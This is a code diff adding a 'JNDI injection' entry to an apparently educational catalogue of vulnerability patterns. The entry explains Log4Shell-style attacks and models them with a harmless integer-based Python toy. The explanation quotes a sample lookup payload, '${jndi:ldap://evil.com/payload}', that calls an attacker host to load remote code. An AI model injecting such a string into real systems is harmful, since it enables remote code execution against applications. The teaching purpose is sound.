@@ -8356,6 +8356,84 @@ print(hijacked)
       description: 'call instructions target real virtual functions through compiler-emitted call sites — CFI validates each as legitimate because the target is a valid vfgadget entry point; movl loads attacker-chosen field values (vptr, field_a) from each counterfeit object as operands for the vfgadget micro-operation; cmpl in the dispatcher loop re-enters the chain for the next counterfeit object, forming a Turing-complete virtual machine invisible to CFG, Intel CET, and shadow stacks',
     },
   },
+  {
+    id: 'jndi-injection',
+    name: 'JNDI INJECTION',
+    severity: 'CRITICAL',
+    category: 'Code Execution',
+    description: 'User-controlled string in a log message triggers a JNDI lookup to an attacker server, which returns a malicious class for remote code execution.',
+    explanation:
+      'JNDI Injection (CWE-917 / CWE-20) occurs when user-supplied input containing a lookup expression — such as ' +
+      '${jndi:ldap://evil.com/payload} — is passed to a logging or naming framework that resolves the expression ' +
+      'before sanitizing it. The framework performs a JNDI (Java Naming and Directory Interface) lookup to an ' +
+      'attacker-controlled LDAP or RMI server, which returns a Reference object pointing to a remote Java class. ' +
+      'The JVM fetches, loads, and instantiates the malicious class, executing the attacker\'s static initializer ' +
+      'or constructor — achieving unauthenticated remote code execution with the privileges of the application. ' +
+      'CVE-2021-44228 (Log4Shell, CVSS 10.0) is the defining example and one of the most impactful vulnerabilities ' +
+      'in computing history: Apache Log4j 2.x processed ${jndi:...} expressions in logged strings, meaning any ' +
+      'application field written to a log — HTTP User-Agent, search queries, usernames, API parameters — became an ' +
+      'RCE vector. Over 35,000 packages (8% of Maven Central) were affected; CISA, NSA, and Five Eyes issued joint ' +
+      'emergency directives. Exploitation began within hours of disclosure in December 2021, with state-sponsored ' +
+      'actors (HAFNIUM, APT41) and ransomware groups (Conti, Khonsari) weaponizing it for mass compromise. ' +
+      'CVE-2025-70974 (Fastjson, CVSS 10.0) allowed JNDI injection via @type deserialization in JSON documents, ' +
+      'forcing the parser to resolve attacker-controlled LDAP references. CVE-2026-50633 (Apache CXF) exploited ' +
+      'JNDI injection through JCA deployment descriptors for RCE on enterprise service buses. CVE-2021-45046 and ' +
+      'CVE-2021-45105 were successive Log4j bypasses of the initial fix, proving the attack surface is inherent to ' +
+      'any framework that performs string interpolation before input validation. ' +
+      'In the assembly, movl loads the attacker-supplied lookup reference value into a stack slot via the log method; ' +
+      'resolve_lookup\'s cmpl checks lookup_enabled == 1 and passes the reference through without sanitization — ' +
+      'fetch_remote\'s addl combines the attacker\'s reference with the server base address to compute the payload ' +
+      'address, and execute\'s addl invokes the loaded class with no type validation or origin check.',
+    code:
+`# CVE pattern: logged user input triggers JNDI lookup — loads remote class
+class Logger:
+    def __init__(self, level):
+        self.level = level
+        self.log_count = 0
+        self.last_msg = 0
+        self.lookup_enabled = 1
+
+    def log(self, message):
+        self.last_msg = message
+        self.log_count += 1
+        return self.last_msg
+
+    def resolve_lookup(self, ref):
+        if self.lookup_enabled == 1:
+            result = ref
+        else:
+            result = 0
+        return result
+
+class NamingContext:
+    def __init__(self, base_url):
+        self.base_url = base_url
+        self.loaded_class = 0
+        self.executed = 0
+
+    def fetch_remote(self, ref):
+        self.loaded_class = self.base_url + ref
+        return self.loaded_class
+
+    def execute(self):
+        self.executed = 1
+        result = self.loaded_class + self.executed
+        return result
+
+logger = Logger(1)
+attacker_input = 3735928559
+logger.log(attacker_input)
+jndi_ref = logger.resolve_lookup(attacker_input)
+ctx = NamingContext(4196352)
+payload = ctx.fetch_remote(jndi_ref)
+hijacked = ctx.execute()
+print(hijacked)
+`,
+    badAsm: {
+      patterns: ['cmpl', 'movl', 'addl'],
+      description: 'movl loads the attacker-supplied lookup reference (0xDEADBEEF) into a stack slot via the log method; cmpl in resolve_lookup checks lookup_enabled == 1 and passes the reference through without sanitization — fetch_remote\'s addl combines the reference with the LDAP server base address to compute the malicious class address, and execute\'s addl invokes it with no type or origin check, achieving unauthenticated RCE',
+    },
+  },
 ]
 
 // ─── Severity helpers ──────────────────────────────────────────────────────
